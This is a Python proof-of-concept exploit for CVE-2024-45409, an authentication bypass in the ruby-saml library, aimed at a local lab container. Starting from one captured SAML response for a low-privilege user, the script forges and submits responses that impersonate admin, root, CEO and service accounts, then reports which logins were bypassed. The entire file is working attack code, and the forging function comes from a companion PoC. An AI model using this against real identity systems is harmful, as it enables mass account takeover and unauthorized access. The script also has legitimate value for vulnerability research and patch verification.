#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : ruby-saml SAML Auth Bypass — Multi-User Impersonation
# CVE            : CVE-2024-45409
# Vendor         : SAML-Toolkits / OneLogin
# Product        : ruby-saml
# Affected       : 1.13.0 – 1.16.0, <= 1.12.2
# Type           : CWE-347 - Improper Verification of Cryptographic Signature
# CVSS           : 10.0 (Critical)
# Platform       : Any (Ruby / SAML)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2024-09-10
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2024-45409 — Multi-User Impersonation (Vector 2)

Demonstrates that a SINGLE captured SAML response can be reused to
impersonate MULTIPLE different users, proving mass-compromise capability.

ATTACK CHAIN:
  1. Capture one legitimate SAML response as a low-privilege user
  2. Forge the response for each target user (admin, root, ceo, etc.)
  3. Submit each forged response — all users impersonated from one source

PREREQUISITES:
  - Running CVE-2024-45409 lab container
  - Python 3 with lxml library

REFERENCES:
  - CVE-2024-45409
  - https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2
"""

import os
import subprocess
import sys
import urllib.request

try:
    from lxml import etree
except ImportError:
    print("[!] lxml is required: pip install lxml", file=sys.stderr)
    sys.exit(1)

# Import the forge function from the primary PoC
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from poc import forge_saml_response, submit_saml_response_raw, log


def main():
    container = "cve-2024-45409-vulnerable"
    target_host = "localhost"
    target_port = 4567

    print("=" * 70)
    print("  CVE-2024-45409 — Vector 2: Multi-User Impersonation")
    print("  One captured response → impersonate ANY user")
    print("=" * 70)
    print()

    # Step 1: Generate ONE legitimate SAML response
    print("[*] Generating single legitimate response as lowpriv@example.com")
    result = subprocess.run(
        ["docker", "exec", container, "ruby", "/app/mock_idp.rb",
         "lowpriv@example.com", "/app/multi_user_legit.xml"],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        print(f"[!] Failed: {result.stderr}")
        sys.exit(1)

    legit_xml = subprocess.check_output(
        ["docker", "exec", container, "cat", "/app/multi_user_legit.xml"]
    )
    print(f"    Captured response: {len(legit_xml)} bytes")
    print()

    # Step 2: Impersonate multiple users from the SAME captured response
    target_users = [
        "admin@example.com",
        "root@example.com",
        "ceo@example.com",
        "security-team@example.com",
        "service-account@example.com",
    ]

    results = []
    print(f"[*] Attempting to impersonate {len(target_users)} different users")
    print(f"    from the SAME captured response (lowpriv@example.com)")
    print()

    for target in target_users:
        try:
            forged = forge_saml_response(legit_xml, target)
            status, body = submit_saml_response_raw(target_host, target_port, forged)

            if status == 200 and '"authenticated"' in body and target in body:
                results.append((target, "BYPASSED", body))
                print(f"  [VULN] {target:40s} → authenticated! (HTTP {status})")
            else:
                results.append((target, "FAILED", body))
                print(f"  [FAIL] {target:40s} → rejected (HTTP {status})")
        except Exception as e:
            results.append((target, "ERROR", str(e)))
            print(f"  [ERR]  {target:40s} → {e}")

    # Summary
    bypassed = sum(1 for _, s, _ in results if s == "BYPASSED")
    print()
    print("=" * 70)
    print(f"  Results: {bypassed}/{len(target_users)} users impersonated")
    print(f"  Source:  lowpriv@example.com (single captured response)")
    print()
    if bypassed == len(target_users):
        print("  [CRITICAL] ALL users impersonated from ONE response!")
        print("  This confirms the severity: any captured SAML response")
        print("  can be reused to compromise the entire user base.")
    print("=" * 70)

    sys.exit(0 if bypassed > 0 else 1)


if __name__ == "__main__":
    main()
